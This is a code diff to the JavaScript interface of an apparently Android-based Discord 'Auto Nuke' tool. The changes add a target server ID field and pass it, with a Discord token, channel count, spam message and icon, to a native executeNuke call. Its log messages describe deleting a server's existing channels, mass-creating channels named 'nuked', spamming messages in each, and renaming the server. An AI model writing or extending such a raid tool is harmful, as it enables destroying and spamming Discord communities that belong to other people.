@@ -68,6 +68,15 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    // Target Guild ID sync
+    const targetGuildInput = document.getElementById('target-guild-id');
+    if (targetGuildInput) {
+        targetGuildInput.addEventListener('input', (e) => {
+            const sumServer = document.getElementById('sum-server');
+            if (sumServer) sumServer.textContent = e.target.value || 'No definido';
+        });
+    }
+
     // Terminal Logging Helper
     function appendLog(message, type = 'info') {
         const output = document.getElementById('terminal-output');
@@ -97,6 +106,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // Image Picker
+    let selectedImageName = '';
     const pickImageBtn = document.getElementById('btn-pick-image');
     if (pickImageBtn) {
         pickImageBtn.addEventListener('click', () => {
@@ -105,12 +115,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 window.AndroidBridge.pickServerImage();
             } else {
                 showToast('Selector de fotos disponible en app nativa');
-                onImageSelected('server_icon_custom.png');
+                onImageSelected('server_icon.png');
             }
         });
     }
 
     window.onImageSelected = function(fileName) {
+        selectedImageName = fileName;
         const nameDisplay = document.getElementById('selected-file-name');
         if (nameDisplay) {
             nameDisplay.textContent = `Imagen seleccionada: ${fileName}`;
@@ -121,7 +132,6 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     // Fetch Servers List
-    let selectedServerId = null;
     const fetchServersBtn = document.getElementById('btn-fetch-servers');
     if (fetchServersBtn) {
         fetchServersBtn.addEventListener('click', () => {
@@ -136,15 +146,6 @@ document.addEventListener('DOMContentLoaded', () => {
             appendLog('[DISCORD API] Conectando con API de Discord para listar servidores...', 'info');
             if (window.AndroidBridge && typeof window.AndroidBridge.fetchGuilds === 'function') {
                 window.AndroidBridge.fetchGuilds(token);
-            } else {
-                // Simulate fetched servers for preview / standalone mode
-                setTimeout(() => {
-                    renderServers([
-                        { id: '10928347102', name: '🎮 Gaming Community [Admin]' },
-                        { id: '88371920384', name: '🔥 VIP Lounge Server [Admin]' },
-                        { id: '44920183742', name: '🤖 Bot Testing Hub [Admin]' }
-                    ]);
-                }, 600);
             }
         });
     }
@@ -154,27 +155,34 @@ document.addEventListener('DOMContentLoaded', () => {
         try {
             servers = typeof serversJsonString === 'string' ? JSON.parse(serversJsonString) : serversJsonString;
         } catch (e) {
-            servers = [
-                { id: '10928347102', name: '🎮 Gaming Community [Admin]' },
-                { id: '88371920384', name: '🔥 VIP Lounge Server [Admin]' }
-            ];
+            servers = [];
         }
 
         const container = document.getElementById('servers-container');
         if (!container) return;
         container.innerHTML = '';
 
+        if (servers.length === 0) {
+            container.innerHTML = '<div class="server-item placeholder-msg"><span>No se encontraron servidores o token incorrecto.</span></div>';
+            return;
+        }
+
         servers.forEach(srv => {
             const div = document.createElement('div');
             div.className = 'server-item';
-            div.innerHTML = `<span>${srv.name}</span><span class="badge">SELECCIONAR</span>`;
+            div.innerHTML = `<span>${srv.name} (ID: ${srv.id})</span><span class="badge">SELECCIONAR</span>`;
             div.addEventListener('click', () => {
                 document.querySelectorAll('.server-item').forEach(i => i.classList.remove('selected'));
                 div.classList.add('selected');
-                selectedServerId = srv.id;
+                
+                const targetGuildInput = document.getElementById('target-guild-id');
+                if (targetGuildInput) {
+                    targetGuildInput.value = srv.id;
+                }
                 const sumServer = document.getElementById('sum-server');
-                if (sumServer) sumServer.textContent = srv.name;
-                appendLog(`[SERVER] Servidor seleccionado: ${srv.name} (ID: ${srv.id})`, 'success');
+                if (sumServer) sumServer.textContent = `${srv.name} (${srv.id})`;
+
+                appendLog(`[SERVER] Servidor objetivo seleccionado: ${srv.name} (ID: ${srv.id})`, 'success');
                 showToast(`Servidor seleccionado: ${srv.name}`);
                 switchTab('tab-params');
             });
@@ -188,6 +196,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (executeNukeBtn) {
         executeNukeBtn.addEventListener('click', () => {
             const token = tokenInput ? tokenInput.value.trim() : '';
+            const targetGuildId = targetGuildInput ? targetGuildInput.value.trim() : '';
             const serverName = document.getElementById('server-name-input').value;
             const chanName = channelNameInput ? channelNameInput.value : 'nuked';
             const chanLimit = channelLimitSlider ? channelLimitSlider.value : 50;
@@ -201,16 +210,22 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-            appendLog('⚡ [AUTO NUKE] Iniciando protocolo de ataque masivo...', 'error');
-            appendLog(`[PYTHON] Conectando socket a servidor backend...`, 'info');
-            appendLog(`[CONFIG] Servidor objetivo: ${selectedServerId || 'Predeterminado'} | Nuevo Nombre: ${serverName}`, 'info');
-            appendLog(`[NUKE] Creando ${chanLimit} canales con nombre "${chanName}"...`, 'info');
+            if (!targetGuildId) {
+                appendLog('ERROR CRÍTICO: Falta la ID del Servidor Objetivo.', 'error');
+                showToast('Falta ID de Servidor');
+                switchTab('tab-config');
+                return;
+            }
+
+            appendLog('⚡ [AUTO NUKE] Iniciando bot Python discord.py...', 'success');
+            appendLog(`[CONFIG] Servidor ID: ${targetGuildId} | Nuevo Nombre: ${serverName}`, 'info');
+            appendLog(`[NUKE] Borrando canales existentes y creando ${chanLimit} canales con nombre "${chanName}"...`, 'info');
             appendLog(`[SPAM] Enviando ${msgLimit} mensajes por canal...`, 'info');
 
             if (window.AndroidBridge && typeof window.AndroidBridge.executeNuke === 'function') {
-                window.AndroidBridge.executeNuke(token, selectedServerId || 'default', serverName, chanName, chanLimit, msgContent, msgLimit);
+                window.AndroidBridge.executeNuke(token, targetGuildId, serverName, chanName, chanLimit, msgContent, msgLimit, selectedImageName);
             }
-            showToast('¡Proceso de Auto Nuke enviado!');
+            showToast('¡Bot Python iniciado!');
         });
     }
 
